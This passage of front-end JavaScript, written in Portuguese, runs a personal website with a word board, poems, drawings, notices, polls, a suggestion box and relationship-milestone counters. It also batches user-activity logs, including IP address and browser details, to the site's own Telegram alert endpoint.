

document.addEventListener("DOMContentLoaded", () => {
  const menu = document.getElementById("menu");
  const menuleft = document.getElementById("menuleft");
  const Newboard = document.getElementById("Newboard");
  const counters = document.getElementById("counters");

  const avisosBackBtn = document.getElementById("avisos-back");
  const pollsBackBtn = document.getElementById("polls-back");
  const btnAbrirQuadro = document.getElementById("btnAbrirQuadro");
  const backBoardBtn = document.getElementById("back-board-btn");
  const openTodayBtn = document.getElementById("open-today");
  const backFromTodayBtn = document.getElementById("back-from-today");
  const avisosModal = document.getElementById("avisos-modal");
  const pollsModal = document.getElementById("polls-modal");
  const todayModal = document.getElementById("today-modal");
  const poemModal = document.getElementById("poem-modal");
  const sobreModal = document.getElementById("sobre-modal");
  const menuSobre = document.getElementById("menuSobre");
const menuSugestao = document.getElementById("menuSugestao");

    const wordBoard = document.getElementById("word-board");
const newWordInput = document.getElementById("new-word");
const addWordBtn = document.getElementById("add-word");
const imageInput = document.getElementById("new-image");

document.getElementById("login-btn").addEventListener("click", login);
document.getElementById("register-btn").addEventListener("click", register);



  let sendingAlertVisitas = false;
  let sendingAlertInteracoes = false;

  

function mostrarModal(modal) {
  if (!modal) return;
  modal.style.display = "flex"; // flex garante centralização
}


function abrirModalDinamico(titulo, conteudo, botoes = []) {
  modalTitle.textContent = titulo;
  modalBody.textContent = conteudo;
  modalActions.innerHTML = "";
  botoes.forEach(b => {
    const button = document.createElement("button");
    button.textContent = b.text;
    button.onclick = b.onClick;
    modalActions.appendChild(button);
  });
  modal.style.display = "flex";
  overlay.classList.add("active");
}

// ---------- INICIO DO SISTEMA DE LOGS EM FILA ----------

const userLogsQueue = [];
let sendingLogs = false;

// Escapa caracteres especiais do MarkdownV2
function escapeMarkdown(text) {
  if (!text) return "";
  return text
    .replace(/_/g, "\\_")
    .replace(/\*/g, "\\*")
    .replace(/\[/g, "\\[")
    .replace(/\]/g, "\\]")
    .replace(/\(/g, "\\(")
    .replace(/\)/g, "\\)")
    .replace(/~/g, "\\~")
    .replace(/`/g, "\\`")
    .replace(/>/g, "\\>")
    .replace(/#/g, "\\#")
    .replace(/\+/g, "\\+")
    .replace(/-/g, "\\-")
    .replace(/=/g, "\\=")
    .replace(/\|/g, "\\|")
    .replace(/\{/g, "\\{")
    .replace(/\}/g, "\\}")
    .replace(/\./g, "\\.")
    .replace(/!/g, "\\!");
}

// Emoji por tipo de ação
function getActionEmoji(action) {
  action = action.toLowerCase();
  if (action.includes("erro") || action.includes("fail") || action.includes("❌")) return "🔴";
  if (action.includes("success") || action.includes("✅") || action.includes("adicionou")) return "🟢";
  if (action.includes("aviso") || action.includes("⚠️") || action.includes("warning")) return "🟡";
  if (action.includes("info") || action.includes("ℹ️")) return "🔵";
  return "🟣";
}

// Mini gráfico de status com emojis
function getMiniGraph(index) {
  const blocks = ["⬛","🟩","🟨","🟧","🟥"];
  return blocks[index % blocks.length].repeat(5);
}

function formatTimestampBR(ts) {
  const date = new Date(ts);

  // Opções para horário de Brasília
  const options = {
    timeZone: "America/Sao_Paulo",
    year: "numeric",
    month: "2-digit",
    day: "2-digit",
    hour: "2-digit",
    minute: "2-digit",
    second: "2-digit",
    hour12: false,
  };

  // Formata com Intl.DateTimeFormat
  const formatter = new Intl.DateTimeFormat("pt-BR", options);
  const [
    { value: day },,
    { value: month },,
    { value: year },,
    { value: hour },,
    { value: minute },,
    { value: second }
  ] = formatter.formatToParts(date);

  return `🕒 *${day}/${month}/${year} ${hour}:${minute}:${second} BRT*`;
}


// Formata cada log como cartão cinematográfico
function formatLogMessage(log, index = null) {
  const idx = index !== null ? `#${index + 1} ` : "";
  const emoji = getActionEmoji(log.actionType);
  const graph = getMiniGraph(index);

  return `
${graph} *${emoji} LOG ${idx}* ${graph}
┏━━━━━━━━━━━━━━━━━━━━━━━┓
👤 Usuário: ${escapeMarkdown(log.user)}
🌐 IP: ${escapeMarkdown(log.ip)}
⚡ Ação: ${escapeMarkdown(log.actionType)}
🎯 Alvo: ${escapeMarkdown(log.target || "")}
🔎Tamanho: ${escapeMarkdown(log.tamanho || "Nada Encontrado")}
📝 Descrição: ${escapeMarkdown(log.description || "Nada Encontrado")}
⏱️ Data: ${escapeMarkdown(log.timestamp)}
┗━━━━━━━━━━━━━━━━━━━━━━━┛`;
}
function getUserEnvironment() {
  const ua = navigator.userAgent;

  let browser = "Desconhecido";
  if (ua.includes("Firefox")) browser = "Firefox";
  else if (ua.includes("Chrome") && !ua.includes("Edge")) browser = "Chrome";
  else if (ua.includes("Safari") && !ua.includes("Chrome")) browser = "Safari";
  else if (ua.includes("Edge")) browser = "Edge";
  else if (ua.includes("OPR") || ua.includes("Opera")) browser = "Opera";

  let os = "Desconhecido";
  if (ua.includes("Windows")) os = "Windows";
  else if (ua.includes("Macintosh")) os = "Mac";
  else if (ua.includes("Linux")) os = "Linux";
  else if (/Android/.test(ua)) os = "Android";
  else if (/iPhone|iPad|iPod/.test(ua)) os = "iOS";

  return `${browser} / ${os}`;
}

function getScreenInfo() {
  const screenWidth = window.screen.width;
  const screenHeight = window.screen.height;
  const innerWidth = window.innerWidth;
  const innerHeight = window.innerHeight;

  return `🖥️ Tela: ${screenWidth}x${screenHeight} | 🪟 Área visível: ${innerWidth}x${innerHeight}`;
}

// Adiciona log à fila
function enqueueLog(action, target = "", extra = "") {
  const username = usernameSpan?.textContent || "guest";
  userLogsQueue.push({
    timestamp: new Date().toISOString(),
    user: username,
    ip: userip,
    actionType: action,
    target: getUserEnvironment(),
    tamanho: getScreenInfo(),
    description: extra
  });
}

// Envia batch de logs para Telegram
async function sendBatch(message) {
  try {
    await fetch("/api/send-telegram-alert", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ message, type: "interacoes" }),
    });
  } catch (err) {
    console.error("Erro ao enviar batch:", err);
  }
}

// Envio periódico em batches (máx 4000 chars)
setInterval(async () => {
  if (sendingLogs || userLogsQueue.length === 0) return;
  sendingLogs = true;

  const logsToSend = [...userLogsQueue];
  userLogsQueue.length = 0;

  const maxLength = 4000;
  let currentBatch = [];
  let currentLength = 0;

  try {
    logsToSend.forEach((log, i) => {
      const msg = formatLogMessage(log, i);

      if (currentLength + msg.length > maxLength) {
        const batchMessage = `✨ *📋 Batch de Logs* (${currentBatch.length} itens)\n` +
                             currentBatch.join("\n\n") +
                             `\n💫 Fim do Batch`;
        sendBatch(batchMessage);
        currentBatch = [];
        currentLength = 0;
      }

      currentBatch.push(msg);
      currentLength += msg.length;
    });

    if (currentBatch.length) {
      const batchMessage = `✨ *📋 Batch de Logs* (${currentBatch.length} itens)\n` +
                           currentBatch.join("\n\n") +
                           `\n💫 Fim do Batch`;
      sendBatch(batchMessage);
    }

  } catch (err) {
    console.error("Erro ao enviar logs em batches:", err);
    userLogsQueue.unshift(...logsToSend);
  } finally {
    sendingLogs = false;
  }
}, 30000);


window.addEventListener("beforeunload", () => {
  if (userLogsQueue.length > 0) {
    localStorage.setItem("pendingLogs", JSON.stringify(userLogsQueue));
  }
});

// Recupera logs salvos do localStorage
const pending = localStorage.getItem("pendingLogs");
if (pending) {
  try {
    const recovered = JSON.parse(pending);
    if (Array.isArray(recovered) && recovered.length > 0) {
      userLogsQueue.push(...recovered);
      console.log("📥 Logs recuperados do localStorage:", recovered.length);
    }
    localStorage.removeItem("pendingLogs"); // limpa após recuperar
  } catch (err) {
    console.error("Erro ao recuperar logs pendentes:", err);
    localStorage.removeItem("pendingLogs");
  }
}





window.addEventListener("load", () => {
  const pending = JSON.parse(localStorage.getItem("pendingTelegramEvents") || "[]");
  pending.forEach(msg => enqueueTelegram(msg));
  localStorage.removeItem("pendingTelegramEvents");
});



  /**
 * @param {string} message
 */
async function sendTelegramVisitas(message) {
  if (sendingAlertVisitas) return;
  sendingAlertVisitas = true;

  try {
    const res = await fetch("/api/send-telegram-alert", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ message, type: "visitas" }), // apenas a mensagem e tipo
    });

    const data = await res.json();
    if (!data.success) throw new Error(data.error || "Erro desconhecido");
  } finally {
    sendingAlertVisitas = false;
  }
}





function fecharTodosModais() {
  const openModals = document.querySelectorAll('.modal.show, .modal[style*="display: flex"]');
  openModals.forEach(modal => {
    modal.style.display = "none";
    modal.classList.remove("show");
  });

  overlay.classList.remove("active");

  // Restaurar menus somente se nenhum modal ainda estiver aberto
  if (document.querySelectorAll('.modal.show, .modal[style*="display: flex"]').length === 0) {
    menu.style.display = "flex";
    menuleft.style.display = "flex";
  }
}

let userip = "";

async function fetchUserIP() {
  try {
    const res = await fetch("/api/get-ip");
    const data = await res.json();
    userip = data.ip || "";
  } catch (err) {
    console.error("Erro ao obter IP do usuário:", err);
  }
}

fetchUserIP();



 

  function showSection(section) {
    const sections = [menu, menuleft, Newboard, counters];
    sections.forEach((s) => (s.style.display = "none"));
    section.style.display = "flex";
  }

  function showNotification(message, type = "info", duration = 3000) {
    const notif = document.getElementById("notification");
    notif.textContent = message;

    switch (type) {
      case "success":
        notif.style.backgroundColor = "#4CAF50"; 
        enqueueLog("✅ Notificação de sucesso exibida");
        break;
      case "error":
        notif.style.backgroundColor = "#f44336"; 
        enqueueLog("❌ Notificação de erro exibida");
        break;
      case "warning":
        notif.style.backgroundColor = "#ff9800"; 
         enqueueLog("⚠️ Notificação de aviso exibida");
        break;
      default:
        notif.style.backgroundColor = "#1e1e2f"; 
        enqueueLog("ℹ️ Notificação informativa exibida");
    }

    notif.classList.add("show");

    setTimeout(() => {
      notif.classList.remove("show");
    }, duration);
  }


  btnAbrirQuadro.addEventListener("click", () => showSection(Newboard));
  backBoardBtn.addEventListener("click", () => showSection(menu));

  function backToMenu() {
    counters.style.display = "none";
    menu.style.display = "flex";
    menuleft.style.display = "flex";

    if (intervalId) {
      clearInterval(intervalId);
      intervalId = null;
    }
  }

  const counterElems = [
    document.getElementById("counter1"),
    document.getElementById("counter2"),
    document.getElementById("counter3"),
  ];

  const countersData = [
    {
      name: "EU CONHECI A MULHER QUE VIRIA SER O AMOR DA MINHA VIDA",
      date: new Date("2024-11-27T22:30:00"),
      image: "1.png",
    },
    {
      name: "EU ADMITI QUE AMAVA ELA",
      date: new Date("2025-03-10T07:00:00"),
      image: "1.png",
    },
    {
      name: "ATÉ, MEU AMOR...",
      date: new Date("2025-08-11T17:15:00"),
      image: "2.png",
    },
  ];

  function formatDate(date) {
    const options = { day: "2-digit", month: "long", year: "numeric" };
    return date.toLocaleDateString("pt-BR", options);
  }

  dayjs.extend(dayjs_plugin_duration);
  dayjs.extend(dayjs_plugin_relativeTime);

  function updateCounter(el, data) {
    const now = dayjs();
    const diff = dayjs.duration(now.diff(dayjs(data.date)));

    el.innerHTML = `
    <div class="counter-header">
      <img src="${data.image}" />
      <div class="counter-text">
        <div class="name">${data.name}</div>
        <div class="time">
          ${diff.years()} anos, ${diff.months()} meses, ${diff.days()} dias,
          ${diff.hours()}h ${diff.minutes()}m 
        </div>
      </div>
    </div>
  `;
  }

  function updateCounters() {
    counterElems.forEach((el, i) => updateCounter(el, countersData[i]));
  }

  let intervalId = null;

  function startCounters() {
    if (intervalId) clearInterval(intervalId);
    intervalId = setInterval(updateCounters, 1000);
  }

  function stopCounters() {
    if (intervalId) {
      clearInterval(intervalId);
      intervalId = null;
    }
  }

  function loadImage(src) {
    return new Promise((resolve, reject) => {
      const img = new Image();
      img.src = src;
      img.onload = () => resolve(img);
      img.onerror = reject;
    });
  }

  async function showCounters() {
    menu.style.display = "none";
    menuleft.style.display = "none";
    counters.style.display = "block";
    enqueueLog("⏳ Usuário abriu Contadores");
    const loadingEl = document.getElementById("counter-loading");
    loadingEl.style.display = "block";

    counterElems.forEach((el) => (el.style.display = "none"));

    try {
      const imagePromises = countersData.map((data) => loadImage(data.image));

      const loadedImages = await Promise.all(imagePromises);

      counterElems.forEach((el, i) => {
        el.style.display = "block";
        updateCounter(el, countersData[i]);
      });
    } catch (err) {
      console.error("Erro ao carregar imagens dos contadores:", err);
    } finally {
      loadingEl.style.display = "none";
      startCounters();
    }
  }



  const poemBtn = document.getElementById("poem-btn");
  const poemText = document.getElementById("poem-text");
  

poemBtn.addEventListener("click", async () => {
  mostrarModal(poemModal);

  enqueueLog("📜 Usuário abriu Poema do Dia");

  const poemTextEl = document.getElementById("poem-text");
  poemTextEl.textContent = "⌛ Carregando poema...";

  try {
    const res = await fetch("/api/poem");
    const data = await res.json();
    poemTextEl.textContent = data.poem || "💖 Nenhum poema disponível 💖";
  } catch (err) {  
    poemTextEl.textContent = "❌ Erro ao carregar poema 😢";
    enqueueLog("❌ Erro ao carregar Poema do Dia");
  }
});

const closePoemBtn = document.getElementById("close-modal"); // seu botão X do poema

if (closePoemBtn) {
  closePoemBtn.addEventListener("click", () => {
    if (!poemModal) return;
    poemModal.style.display = "none"; // fecha apenas o modal do poema
    poemModal.classList.remove("show"); // remove classe show, se estiver usando
    overlay.classList.remove("active"); // remove overlay se quiser
    enqueueLog("📜 Usuário fechou Poema do Dia");
  });
}

avisosBackBtn?.addEventListener("click", () => {
  fecharTodosModais();
  enqueueLog("🔔 Usuário fechou Avisos");
});

pollsBackBtn?.addEventListener("click", fecharTodosModais);
btnAbrirQuadro?.addEventListener("click", () => showSection(Newboard));
backBoardBtn?.addEventListener("click", () => showSection(menu));



function closeModalClickOutside(modal) {
  window.addEventListener("click", (e) => {
    if (e.target === modal) fecharTodosModais();
  });
}

closeModalClickOutside(poemModal);
closeModalClickOutside(sobreModal);
closeModalClickOutside(todayModal);


  const btn = document.getElementById("square-menu");
  const sidebar = document.getElementById("sidebar");
  const overlay = document.getElementById("overlay");
  const modal = document.getElementById("custom-modal");
  const modalTitle = document.getElementById("custom-title");
  const modalBody = document.getElementById("custom-body");
  const modalActions = document.getElementById("custom-actions");
  const modalClose = document.getElementById("custom-close");

btn.addEventListener("click", () => {
  const isOpen = btn.getAttribute("data-open") === "true";
  btn.setAttribute("data-open", (!isOpen).toString());
  btn.setAttribute("aria-expanded", (!isOpen).toString());
  sidebar.classList.toggle("open");
  enqueueLog("Abriu/Fechou a aba Lateral");
});

overlay.addEventListener("click", () => {
  const modals = document.querySelectorAll('.modal.show, .modal[style*="display: flex"]');
  modals.forEach(modal => modal.style.display = 'none');
  modals.forEach(modal => modal.classList.remove('show'));
  overlay.classList.remove("active");

modals.forEach(modal => enqueueLog("❌ Fechou modal clicando fora", modal.id));
  // Restaurar menus
  menu.style.display = "flex";
  menuleft.style.display = "flex";
});

  modalClose.addEventListener("click", fecharModal);

  function abrirModal(titulo, conteudo, botoes = []) {
    modalTitle.textContent = titulo;
    modalBody.textContent = conteudo;
    modalActions.innerHTML = "";
    botoes.forEach((b) => {
      const button = document.createElement("button");
      button.textContent = b.text;
      button.onclick = b.onClick;
      modalActions.appendChild(button);
    });
    modal.style.display = "flex";
    overlay.classList.add("active");
  }
  function fecharModal() {
    modal.style.display = "none";

    overlay.classList.remove("active");

    sidebar.classList.remove("open");
    btn.setAttribute("data-open", "false");
    btn.setAttribute("aria-expanded", "false");

    menu.style.display = "flex";
    menuleft.style.display = "flex";

  }

  const sobreClose = document.getElementById("sobre-close");

  menuSobre.addEventListener("click", () => {
  mostrarModal(sobreModal);
enqueueLog("modal_open", "sobreModal", "Usuário abriu Sobre este site");
});

  sobreClose.addEventListener("click", () => {
  if (!sobreModal) return;
  sobreModal.style.display = "none"; // garante que fecha
  sobreModal.classList.remove("show"); // remove classe show
  overlay.classList.remove("active");  // remove o overlay
  menu.style.display = "flex";         // restaura menus
  menuleft.style.display = "flex";

  enqueueLog("ℹ️ Usuário fechou Sobre este site");
});



function addWordToBoard(item) {
  const card = document.createElement("div");
  card.className = "word-card";

  const imgUrl = item.imagem || item.image; // aceita os dois nomes

  if (imgUrl) {
    const img = document.createElement("img");
    img.src = getGithubRawUrl(imgUrl); // garante URL certa
    img.alt = item.palavra || "Imagem";
    img.className = "word-card-img";
    card.appendChild(img);
  }

  if (item.palavra) {
    const text = document.createElement("p");
    text.textContent = item.palavra;
    text.className = "word-card-text";
    card.appendChild(text);
  }

  wordBoard.appendChild(card);
}


async function loadWords() {
  const res = await fetch("/api/quadro-palavras");
  const data = await res.json();
  data.sort((a, b) => new Date(a.created_at) - new Date(b.created_at));
  wordBoard.innerHTML = "";
  data.forEach(addWordToBoard);
  wordBoard.style.display = "flex";
}

// Depois disso, pode chamar:
loadWords();
window.addWordToBoard = addWordToBoard;

 


  const confirmModal = document.getElementById("confirmModal");
  const menuDelete = document.getElementById("menuDelete");
  const modalContent = document.getElementById("modalContent");
  let sendingAlert = false;




 const suggestionModal = document.getElementById("suggestionModal");
const closeSuggestionBtn = document.getElementById("closeSuggestion");

menuSugestao.addEventListener("click", () => {
  if (!suggestionModal) return;
  suggestionModal.classList.add("show"); // ou style.display = "block"
  enqueueLog("✏️ Usuário abriu Sugestões/Reclamações");
});

closeSuggestionBtn?.addEventListener("click", () => {
  if (!suggestionModal) return;
  suggestionModal.classList.remove("show"); // ou style.display = "none"
  enqueueLog("✏️ Usuário fechou Sugestões/Reclamações");
});



document.getElementById("sendSuggestion").addEventListener("click", async () => {
  const textEl = document.getElementById("suggestionText");
  const text = textEl.value.trim();
  if (!text) return showNotification("⚠️ Digite uma sugestão antes de enviar!", "warning");

  

  try {
    await fetch("/api/send-telegram-alert", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ message: `💡 Nova sugestão/reclamação:\n\n${text}`, type: "interacoes" }),
      
    });


    showNotification("✅ Sugestão enviada com sucesso!", "success");
    textEl.value = "";
    fecharTodosModais();
    enqueueLog("✏️ Usuário enviou uma sugestão com sucesso");
  } catch (err) {
    if (err.name === "AbortError") {
      console.log("Envio de sugestão abortado pelo fechamento do modal");
    } else {
      showNotification(`❌ Erro ao enviar sugestão: ${err.message}`, "error");
    }
  } finally {
  }
});

// Abortar fetch se o usuário fechar o modal
document.getElementById("closeSuggestion").addEventListener("click", () => {
  fecharTodosModais();
  enqueueLog("✏️ Usuário fechou Sugestões/Reclamações antes de enviar");
});

function getGithubRawUrl(filename) {
  if (!filename) return "";
  if (filename.startsWith("http")) return filename; // já é URL completa
  return `https://raw.githubusercontent.com/Kalsef/UploadQuadro/main/images/${filename}`;
}

// Quando o usuário selecionar uma imagem
imageInput.addEventListener("change", () => {
  const file = imageInput.files[0];
  if (!file) {
    return; // nada selecionado
  }
  addImage(file); // chama sua função que já trata o upload
  imageInput.value = ""; // limpa para poder selecionar a mesma imagem de novo se quiser
});

  addWordBtn.addEventListener("click", async () => {
    const word = newWordInput.value.trim();
    if (!word) {
      showNotification("⚠️ Digite uma palavra antes de adicionar!", "warning");
      return;
    }

    try {
      const res = await fetch("/api/quadro-palavras", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ palavra: word }),
      });
      const result = await res.json();
      if (result.success) {
        showNotification(`✅ Palavra "${word}" adicionada!`, "success");
        loadWords(); 
        newWordInput.value = "";
        enqueueLog("🖱️ Usuário clicou: Adicionou uma nova palavra")
      } else {
        showNotification(
          `❌ Erro ao adicionar: ${result.error || "desconhecido"}`,
          "error"
        );
        enqueueLog("❌ Erro ao carregar palavras do Quadro de Palavras");
      }
    } catch (err) {
      console.error(err);
      showNotification("❌ Falha na conexão ao adicionar palavra.", "error");
      enqueueLog("❌ Falha na conexão ao adicionar palavra no Quadro de Palavras");
    }
  });  


// Abrir e voltar do Quadro de Palavras
btnAbrirQuadro?.addEventListener("click", () => {
  [menu, menuleft, counters].forEach(el => el.style.display = "none");
  Newboard.style.display = "block";
enqueueLog("section_open", "Newboard", "Usuário abriu Quadro de Palavras");
});

backBoardBtn?.addEventListener("click", () => {
  Newboard.style.display = "none";
  menu.style.display = "flex";
  menuleft.style.display = "flex";
  enqueueLog("📝 Usuário voltou ao menu do Quadro de Palavras");
});

// Enter no input adiciona a palavra
newWordInput?.addEventListener("keypress", (e) => {
  if (e.key === "Enter") addWordBtn.click();
});





async function addWord(word) {
  if (!word) return;

  const formData = new FormData();
  formData.append("palavra", word);

  try {
    const res = await fetch("/api/quadro-palavras", {
      method: "POST",
      body: formData,
    });
    const result = await res.json();
    if (result.success) {
      showNotification("✅ Palavra adicionada!", "success");
      loadWords();
      newWordInput.value = "";
enqueueLog("add_word", "new-word", `Palavra adicionada: ${word}`);    } else {
      showNotification(`❌ Erro ao adicionar palavra: ${result.error || "desconhecido"}`, "error");
    }
  } catch (err) {
    showNotification(`❌ Erro de rede: ${err.message}`, "error");
  }
}



// Adiciona imagem
async function addImage(imageFile) {
  if (!imageFile) return;

  const formData = new FormData();
  formData.append("image", imageFile);

  try {
    const res = await fetch("/api/quadro-palavras", {
      method: "POST",
      body: formData,
    });
    const result = await res.json();
    if (result.success) {
      showNotification("✅ Imagem adicionada!", "success");
      loadWords();
      imageInput.value = "";
      enqueueLog(`🖼️ Usuário adicionou imagem: ${imageFile.name}`);
    } else {
      showNotification(`❌ Erro ao adicionar imagem: ${result.error || "desconhecido"}`, "error");
    }
  } catch (err) {
    showNotification(`❌ Erro de rede: ${err.message}`, "error");
  }
}


// depois 





  if (openTodayBtn && todayModal) {
  openTodayBtn.addEventListener("click", async () => {
    mostrarModal(todayModal);
    enqueueLog("🎨 Usuário abriu Desenhos");

    const container = document.getElementById("today-drawing");
    if (container) container.textContent = "⌛ Carregando desenho...";

    try {
      const res = await fetch("/api/today-drawing");
      const data = await res.json();

      if (container) {
        if (data.success) {
          container.innerHTML = data.type === "image"
            ? `<img src="${data.url}" style="max-width:100%; border-radius:12px;">`
            : `<p style="font-style:italic;">${data.content}</p>`;
        } else {
          container.textContent = "❌ Não foi possível carregar o desenho de hoje!";
          enqueueLog("❌ Erro ao carregar desenho do dia");
        }
      }
    } catch (err) {
      if (container) container.textContent = "⚠️ Erro de conexão ao buscar o desenho.";
      enqueueLog("❌ Erro de conexão ao buscar desenho do dia");
    }
  });
}


backFromTodayBtn.addEventListener("click", () => {
  fecharTodosModais();
  enqueueLog("🎨 Usuário fechou Desenho do Dia");
});


  async function loadTodayDrawing() {
    const container = document.getElementById("today-drawing");
    if (container) container.textContent = "⌛ Carregando desenho...";

    try {
      const res = await fetch("/api/today-drawing");
      const data = await res.json();

      if (data.success) {
        if (data.type === "image") {
          container.innerHTML = `<img src="${data.url}" alt="Desenho do dia" style="max-width:100%; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.5);">`;
        } else if (data.type === "text") {
          container.innerHTML = `<p style="font-style:italic; color:#c0d6ff;">${data.content}</p>`;
        } else {
          container.textContent =
            "💖 Desenho recebido, mas formato desconhecido!";
        }
      } else {
        container.textContent =
          "❌ Não foi possível carregar o desenho de hoje!";
      }
    } catch (err) {
      console.error("Erro ao carregar desenho:", err);
      container.textContent = "⚠️ Erro de conexão ao buscar o desenho.";
    }
  }

  const menuAvisos = document.getElementById("menuAvisos");
  const avisosList = document.getElementById("avisos-list");

menuAvisos.addEventListener("click", async e => {
    e.preventDefault();
    mostrarModal(avisosModal);
    enqueueLog("🔔 Usuário abriu avisos");

    const avisosList = document.getElementById("avisos-list");
    avisosList.innerHTML = "⌛ Carregando avisos...";

    try {
  const res = await fetch("/api/avisos");
  let avisos = await res.json();

  if (avisos.length) {
    // Ordena do mais antigo para o mais novo
   avisos.sort((a, b) => new Date(a.criado_em || a.data) - new Date(b.criado_em || b.data));

    avisosList.innerHTML = avisos
  .sort((a, b) => new Date(a.criado_em || a.data) - new Date(b.criado_em || b.data))
  .map(a => `<p>${a.mensagem}</p>`)
  .join("");
  } else {
    avisosList.innerHTML = "<p>✅ Nenhum aviso no momento</p>";
  }
} catch (err) {
  avisosList.innerHTML = "<p>Erro ao carregar avisos 😢</p>";
  enqueueLog("❌ Erro ao carregar avisos");
}
});

  const menuPolls = document.getElementById("menuPolls");
  const pollsList = document.getElementById("polls-list");

  async function votar(pollId, opcao) {
    try {
      const res = await fetch(`/api/polls/${pollId}/vote`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ opcao }),
      });

      const data = await res.json();
      if (data.success) {
        showNotification(`✅ Voto registrado: ${opcao}`, "success");
      } else {
        showNotification(
          `❌ Erro ao registrar voto: ${data.error || "desconhecido"}`,
          "error"
        );
      }
    } catch (err) {
      console.error("Erro ao votar:", err);
      alert("❌ Falha na conexão ao votar.");
    }
  }

 menuPolls.addEventListener("click", async e => {
    e.preventDefault();
    mostrarModal(pollsModal);
    enqueueLog("📊 Usuário abriu votações");

    const pollsList = document.getElementById("polls-list");
    pollsList.innerHTML = "⌛ Carregando votações...";

    try {
      const res = await fetch("/api/polls");
      const polls = await res.json();
      if (!polls.length) return pollsList.innerHTML = "<p>✅ Nenhuma votação no momento</p>";

      pollsList.innerHTML = "";
      polls.forEach(p => {
        const div = document.createElement("div");
        div.className = "poll-item";
        div.innerHTML = `<h3>${p.pergunta}</h3>`;
        p.opcoes.forEach(op => {
          const btn = document.createElement("button");
          btn.textContent = op;
          btn.addEventListener("click", async () => {
            try {
              const res = await fetch(`/api/polls/${p.id}/vote`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ opcao: op })
              });
              const data = await res.json();
              if (data.success) showNotification(`✅ Voto registrado: ${op}`, "success");
              else showNotification(`❌ Erro ao registrar voto: ${data.error}`, "error");
            } catch (err) {
              showNotification("❌ Falha na conexão ao votar.", "error");
            }
          });
          div.appendChild(btn);
        });
        pollsList.appendChild(div);
      });
    } catch (err) {
      pollsList.innerHTML = "<p>Erro ao carregar votações 😢</p>";
      enqueueLog("❌ Erro ao carregar votações");
    }
  });


document.getElementById("counter-btn").addEventListener("click", showCounters);
  document.getElementById("back-btn").addEventListener("click", backToMenu);
 document.getElementById("calendar-btn").addEventListener("click", () => { 
enqueueLog("click", "calendar-btn", "Usuário abriu Calendário");
    window.location.href = "calendar.html"; 
});  


   


const githubRepo = "Kalsef/galeria-desenhos";
const githubPath = "images";
const galleryContainer = document.getElementById("github-gallery");
const featuredContainer = document.getElementById("featured-image");

// Pega arquivos com a data do último commit
async function getFilesWithDate() {
  try {
    const res = await fetch("/api/github-images");
    const files = await res.json();


    if (!Array.isArray(files)) return [];

    const filesWithDate = await Promise.all(files.map(async file => {
      if (!/\.(png|jpg|jpeg|gif)$/i.test(file.name)) return null;

      const commitRes = await fetch(`https://api.github.com/repos/${githubRepo}/commits?path=${githubPath}/${file.name}&per_page=1`);
      const commits = await commitRes.json();
      const date = commits[0]?.commit?.committer?.date || new Date().toISOString();

      return {
        name: file.name,
        download_url: file.download_url,
        date: new Date(date)
      };
    }));

    return filesWithDate.filter(Boolean);
  } catch (err) {
    console.error("Erro ao buscar arquivos do GitHub:", err);
    return [];
  }
}

async function loadGithubImages() {
  galleryContainer.innerHTML = "<p>⌛ Carregando imagens...</p>";

  const files = await getFilesWithDate();
  if (!files.length) {
    galleryContainer.innerHTML = "<p>❌ Nenhuma imagem encontrada</p>";
    return;
  }
  // Ordena do mais antigo para o mais novo
  files.sort((a, b) => a.date - b.date);

  // Inicializa destaque
  let featuredIndex = 0;
  renderFeatured(files[featuredIndex]);
  renderGallery(files.filter((_, i) => i !== featuredIndex), files, featuredIndex);
}

function downloadImage(url, filename) {
  fetch(url)
    .then(res => res.blob())
    .then(blob => {
      const blobUrl = URL.createObjectURL(blob);
      const a = document.createElement("a");
      a.href = blobUrl;
      a.download = filename;
      document.body.appendChild(a);
      a.click();
      a.remove();
      URL.revokeObjectURL(blobUrl);
    })
    .catch(err => console.error("Erro ao baixar imagem:", err));
}


function renderFeatured(file) {
  featuredContainer.innerHTML = `
    <div class="featured-wrapper" style="position: relative; display: inline-block; width: 100%;">
      <img src="${file.download_url}" alt="${file.name}" style="width: 100%; border-radius:12px;">
      <button class="download-btn" onclick="downloadImage('${file.download_url}', '${file.name}')"
        style="
          position: absolute;
          top: 12px;
          right: 12px;
          width: 50px;
          height: 50px;
          border: none;
          border-radius: 8px;
          background: rgba(0,0,0,0.6);
          display: flex;
          align-items: center;
          justify-content: center;
          cursor: pointer;
        ">
        <svg xmlns="http://www.w3.org/2000/svg" width="28" height="28" fill="white" viewBox="0 0 24 24">
          <path d="M12 16v-8M8 12l4 4 4-4M4 20h16" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
        </svg>
      </button>
    </div>
  `;

  // Seleciona o botão recém-criado e adiciona listener
  const btn = featuredContainer.querySelector(".download-btn");
btn.addEventListener("click", () => {
  downloadImage(file.download_url, file.name);
  enqueueLog(`⬇️ Usuário baixou imagem: ${file.name}`);
});
}




function renderGallery(thumbnails, allImages, featuredIndex) {
  galleryContainer.innerHTML = "";
  thumbnails.forEach((imgFile, i) => {
    const card = document.createElement("div");
    card.className = "card";

    const imgEl = document.createElement("img");
    imgEl.src = imgFile.download_url;
    imgEl.alt = imgFile.name;

    // Clique na miniatura troca com o destaque
    card.addEventListener("click", () => {
      const newFeatured = imgFile;
      thumbnails[i] = allImages[featuredIndex]; // troca miniatura
      featuredIndex = allImages.indexOf(newFeatured);
      renderFeatured(newFeatured);  // botão de download é gerado aqui
      renderGallery(thumbnails, allImages, featuredIndex);
      enqueueLog(`🖼️ Usuário trocou destaque para: ${imgFile.name}`);
    });

    card.appendChild(imgEl);
    galleryContainer.appendChild(card);
  });
}

// pegar elementos
const authDiv = document.getElementById("auth");
const appDiv = document.getElementById("app");
const usernameSpan = document.getElementById("username");

// alternar login/registro
document.getElementById("show-register").addEventListener("click", () => {
  enqueueLog("✏️ Usuário clicou em 'Ainda não tem conta? Registrar'");
  document.getElementById("login-box").classList.add("hidden");
  document.getElementById("register-box").classList.remove("hidden");
});

document.getElementById("show-login").addEventListener("click", () => {
  enqueueLog("🔐 Usuário clicou em 'Já tem conta? Login'");
